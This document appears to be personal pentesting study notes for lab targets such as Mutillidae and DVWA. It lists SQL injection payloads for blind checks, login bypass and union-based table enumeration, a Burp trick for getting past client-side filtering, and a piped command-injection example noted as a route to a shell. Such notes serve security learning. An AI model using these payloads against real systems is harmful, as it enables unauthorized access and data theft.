### Testing for SQLi
````

### Testing for Blind Query SQLi
* Blind SQLi queries the database for true and false questions and evaluates the responses from the web server.
* %23 is # encoded. This is used when injecting into the browser.
````
1' and 1=1
1' order by 1#
1' order by 1%23
````

* The following is a password that will execute, although the password is wrong. This is because or 1=1 is always a true statement.
* Executed on Mutillidae
````
aaa' or 1=1 #
````

### Client Side Filtering
* When executing a SQLi you may receive an error message stating some characters in your password/username are blocked.
* Fire up Burp. And execute the SQLi again. You'll notice that Burp hasn't captured any traffic. This confirms that input validation is being done on the client side.
* Submit a syntactically correct password and intercept the request with Burp. Now you can perform the SQLi since the request has passed client side validation.



### Testing for Union Query SQLi
* Also attempt to inject without the quote. Stricter security protocols will be looking for illegal characters that will even pick up encodings
````
1' union select table_name, 2 from information_schema.tables
````

### SQLi with SQLMap


### Command Injection
* This test was done via DVWA on medium security setting

* Pipe commands from the former into the latter
````
ls | pwd
````

* This method can be used to get a shell on a victim
